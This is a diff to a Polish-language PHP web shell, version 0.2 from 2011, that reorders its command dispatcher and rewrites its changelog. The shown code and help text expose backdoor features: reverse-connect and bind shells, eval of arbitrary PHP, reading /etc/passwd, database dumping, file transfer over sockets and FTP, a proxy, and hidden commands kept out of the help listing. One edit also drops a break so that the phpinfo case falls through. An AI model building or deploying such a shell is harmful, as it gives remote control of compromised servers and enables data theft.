@@ -29,6 +29,11 @@ require_once dirname( __FILE__ ) . '/Lib/MysqlDumper.php';
 class Shell
 {
 	/**
+	 * Wersja
+	 */
+	const VERSION = '0.2 b110531';
+
+	/**
 	 * Czas generowania strony
 	 *
 	 * @access private
@@ -117,7 +122,11 @@ class Shell
 	private $bFuncGroupById = FALSE;
 
 	/**
+	 * Sprawdz linie: 170
+	 *
 	 * @ignore
+	 * @access private
+	 * @var    string
 	 */
 	private $sPhpInfo;
 
@@ -164,7 +173,7 @@ class Shell
 		 */
 		$sPhpInfo = <<<CONTENT
 
-/phpinfo
+phpinfo
 CONTENT;
 
 		$this -> sPhpInfo = substr( $sPhpInfo, -7 );
@@ -2015,30 +2024,45 @@ Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
 
 Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
 
-ps, sprawdziłeś komendę <strong>:g4m3</strong> ?
+btw, sprawdziłeś komendę: '<strong>:g4m3</strong>'?
 
 Changelog:
-2011-05-21
-----------
-* dodano polecenie: <strong>mysqldump</strong>
 
-2011-05-20
+2011-05-31 v0.2
 ----------
-* dodano komendy: <strong>proxy</strong>, <strong>ping</strong>, <strong>mysql</strong>
+* Wsparcie dla CLI
+* Shella rozszerzono o następujące komendy:
+	<strong>ping</strong>
+	<strong>mkdir</strong>
+	<strong>cp</strong>
+	<strong>mv</strong>
+	<strong>chmod</strong>
+	<strong>mysql</strong>
+	<strong>mysqldump</strong>
+	<strong>backconnect</strong>
+	<strong>bind</strong>
+	<strong>proxy</strong>
+	<strong>cr3d1ts</strong>
+* polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
 * <strong>php</strong> jest aliasem dla <strong>eval</strong>
-* wsparcie dla CLI
-
-2011-05-16
-----------
-* Shella rozszerzono o następujące komendy: <strong>cp</strong>, <strong>mv</strong>, <strong>mkdir</strong>, <strong>bind</strong>, <strong>backconnect</strong>,
-  <strong>chmod</strong>, <strong>cr3d1ts</strong>
-* komendy <strong>g4m3</strong> i <strong>cr3d1ts</strong> nie wyświetlają się w helpie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
 
 2011-05-15 v0.1
 ---------------
-* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak: <strong>echo</strong>, <strong>eval</strong>,
-  <strong>etcpasswd</strong>, <strong>socketdownload</strong>, <strong>socketupload</strong>, <strong>ftpdownload</strong>, <strong>ftpupload</strong>, <strong>ls</strong>, <strong>cat</strong>,
-  <strong>bcat</strong>, <strong>download</strong>, <strong>help</strong>, <strong>remove</strong>, game</strong>
+* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak:
+	<strong>echo</strong>
+	<strong>ls</strong>
+	<strong>cat</strong>
+	<strong>eval</strong>
+	<strong>remove</strong>
+	<strong>bcat</strong>
+	<strong>socketdownload</strong>
+	<strong>ftpdownload</strong>
+	<strong>download</strong>
+	<strong>socketupload</strong>
+	<strong>ftpupload</strong>
+	<strong>etcpasswd</strong>
+	<strong>game</strong>
+	<strong>help</strong>
 HELP;
 	}
 
@@ -2270,6 +2294,18 @@ HELP;
 			 */
 			switch( $this -> sCmd )
 			{
+				case 'echo':
+					$sConsole = $this -> getCommandEcho();
+					break ;
+				case 'ping':
+					$sConsole = $this -> getCommandPing();
+					break ;
+				case 'ls':
+					$sConsole = $this -> getCommandLs();
+					break ;
+				case 'cat':
+					$sConsole = $this -> getCommandCat();
+					break ;
 				case 'mkdir':
 					$sConsole = $this -> getCommandMkdir();
 					break ;
@@ -2278,79 +2314,6 @@ HELP;
 					break ;
 				case 'mv':
 					$sConsole = $this -> getCommandMv();
-					break ;
-				case 'echo':
-					$sConsole = $this -> getCommandEcho();
-					break ;
-				case 'ping':
-					$sConsole = $this -> getCommandPing();
-					break ;
-				case 'bind':
-					$sConsole = $this -> getCommandBind();
-					break ;
-				case 'backconnect':
-				case 'bc':
-					$sConsole = $this -> getCommandBackConnect();
-					break ;
-				case 'eval':
-				case 'php':
-					$sConsole = $this -> getCommandEval();
-					break ;
-				case 'mysql':
-					$sConsole = $this -> getCommandMysql();
-					break ;
-				case 'mysqldump':
-				case 'mysqldumper':
-				case 'mysqlbackup':
-				case 'dumpdb':
-					$sConsole = $this -> getCommandMysqlDump();
-					break ;
-				case 'etcpasswd':
-					$sConsole = $this -> getCommandEtcPasswd();
-					break ;
-				case 'socketupload':
-				case 'socketup':
-				case 'socketput':
-					$sConsole = $this -> getCommandSocketUpload();
-					break ;
-				case 'socketdownload':
-				case 'socketdown':
-				case 'socketget':
-					$sConsole = $this -> getCommandSocketDownload();
-					break ;
-				case 'ftpupload':
-				case 'ftpup':
-				case 'ftpput':
-					$sConsole = $this -> getCommandFtpUpload();
-					break ;
-				case 'ftpdownload':
-				case 'ftpdown':
-				case 'ftpget':
-					$sConsole = $this -> getCommandFtpDownload();
-					break ;
-				case 'ls':
-					$sConsole = $this -> getCommandLs();
-					break ;
-				case 'bcat':
-				case 'b64':
-					$sConsole = $this -> getCommandBCat();
-					break ;
-				case 'cat':
-					$sConsole = $this -> getCommandCat();
-					break ;
-				case 'download':
-				case 'down':
-				case 'get':
-					$sConsole = $this -> getCommandDownload();
-					break ;
-				case 'g4m3':
-					$sConsole = $this -> getCommandG4m3();
-					break ;
-				case 'help':
-					$sConsole = $this -> getCommandHelp();
-					break ;
-				case $this -> sPhpInfo:
-					$sConsole = $this -> getCommandPhpInfo();
 					break ;
 				case 'remove':
 				case 'rm':
@@ -2361,11 +2324,74 @@ HELP;
 				case 'chmod':
 					$sConsole = $this -> getCommandChmod();
 					break ;
-				case 'cr3d1ts':
-					$sConsole = $this -> getCommandCr3d1ts();
+				case 'bcat':
+				case 'b64':
+					$sConsole = $this -> getCommandBCat();
+					break ;
+				case 'eval':
+				case 'php':
+					$sConsole = $this -> getCommandEval();
+					break ;
+				/**
+				 * @see Line 170
+				 */
+				case $this -> sPhpInfo:
+					$sConsole = $this -> getCommandPhpInfo();
+				case 'socketdownload':
+				case 'socketdown':
+				case 'socketget':
+					$sConsole = $this -> getCommandSocketDownload();
+					break ;
+				case 'ftpdownload':
+				case 'ftpdown':
+				case 'ftpget':
+					$sConsole = $this -> getCommandFtpDownload();
+					break ;
+				case 'download':
+				case 'down':
+				case 'get':
+					$sConsole = $this -> getCommandDownload();
+					break ;
+				case 'socketupload':
+				case 'socketup':
+				case 'socketput':
+					$sConsole = $this -> getCommandSocketUpload();
+					break ;
+				case 'ftpupload':
+				case 'ftpup':
+				case 'ftpput':
+					$sConsole = $this -> getCommandFtpUpload();
+					break ;
+				case 'mysql':
+					$sConsole = $this -> getCommandMysql();
+					break ;
+				case 'mysqldump':
+				case 'mysqldumper':
+				case 'mysqlbackup':
+				case 'dumpdb':
+					$sConsole = $this -> getCommandMysqlDump();
+					break ;
+				case 'backconnect':
+				case 'bc':
+					$sConsole = $this -> getCommandBackConnect();
+					break ;
+				case 'bind':
+					$sConsole = $this -> getCommandBind();
+					break ;
+				case 'etcpasswd':
+					$sConsole = $this -> getCommandEtcPasswd();
 					break ;
 				case 'proxy':
 					$sConsole = $this -> getCommandProxy();
+					break ;
+				case 'cr3d1ts':
+					$sConsole = $this -> getCommandCr3d1ts();
+					break ;
+				case 'g4m3':
+					$sConsole = $this -> getCommandG4m3();
+					break ;
+				case 'help':
+					$sConsole = $this -> getCommandHelp();
 					break ;
 				default :
 					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
@@ -2449,6 +2475,7 @@ HELP;
 		$sMenu = $this -> getMenu();
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
+		$sVersion = self::VERSION;
 return <<<CONTENT
 <!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
 body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
@@ -2480,7 +2507,7 @@ input#cmd-send{margin-top:10px;margin-left:20px;}
 	<div id="content">
 		{$sData}
 	</div>
-	<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s</div>
+	<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
 </div>
 </html>
 CONTENT;
